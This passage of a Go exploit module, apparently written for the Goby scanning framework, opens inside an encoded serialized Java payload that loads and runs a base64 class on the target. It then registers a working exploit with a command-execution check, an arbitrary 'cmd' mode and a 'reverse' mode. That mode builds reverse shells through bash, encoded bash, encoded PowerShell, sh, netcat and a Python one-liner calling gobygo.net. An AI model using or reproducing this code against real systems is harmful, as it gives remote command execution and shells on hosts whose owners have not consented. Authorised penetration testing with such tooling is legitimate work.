GQS2AIFXpwAIOgun/54ZBLYAcBkFtgCCpwAgTrsAXVm3AF4Sg7YAXy22AIS2AF8ShbYAX7YAYbAShrAAAgCnAK0AsAAvAAAAvwDCAC8AAQCaAAAAbgAbAAAA0QAQANIAFgDUABkA1gAiANcALQDYAEIA2QBQANoAWADbAGAA3ABtAN4AdQDfAIIA4QCKAOIAlwDkAJwA5QChAOYApwDoAK0A6QCwAOoAsgDrALUA7QC6AO4AvwDxAMIA7wDDAPAA3wDyAAEAqACYAAEAmQAAAC0AAwABAAAAESoqtABAKrQAQrYAh7YAiFexAAAAAQCaAAAACgACAAAA9wAQAPgACQCpAKoAAQCZAAABHAAGAAQAAACsAUwSibgAMk0sEooEvQAcWQMSIVO2AB0stgAqBL0AHlkDKlO2AB/AACzAACxMpwAETSvHAEMSi7gAMhKMA70AHLYAHQEDvQAetgAfTSy2AAQSjQS9ABxZAxIhU7YAHSwEvQAeWQMqU7YAH8AALMAALEynAARNK8cANBKOuAAyTSwSjQS9ABxZAxIhU7YAHU4tLLYAKgS9AB5ZAypTtgAfwAAswAAsTKcABE0rsAADAAIALQAwAC8ANQBxAHQALwB5AKYAqQAvAAEAmgAAAEYAEQAAAQAAAgECAAgBAwAtAQYAMAEEADEBBwA1AQkATAEKAHEBDQB0AQsAdQEPAHkBEQB/ARIAjwETAKYBFgCpARQAqgEYAAEAqwAAAAIArA==\";\x0aclz = defineClass\x28base64DecodeToByte\x28code\x29\x29;clz.newInstance\x28\x29;t\x00\x04evaluq\x00~\x00\x1b\x00\x00\x00\x01q\x00~\x00#sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\x0aloadFactorI\x00\x09thresholdxp?@\x00\x00\x00\x00\x00\x00w\x08\x00\x00\x00\x10\x00\x00\x00\x00xxx"
		requestConfig.Data = payload
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", vulURL, err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := resp.RawBody

		return commandResult, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashfnuf34nhf3bgfygy4defwfewew

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashfnuf34nhf3bgfygy4defwfewew

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
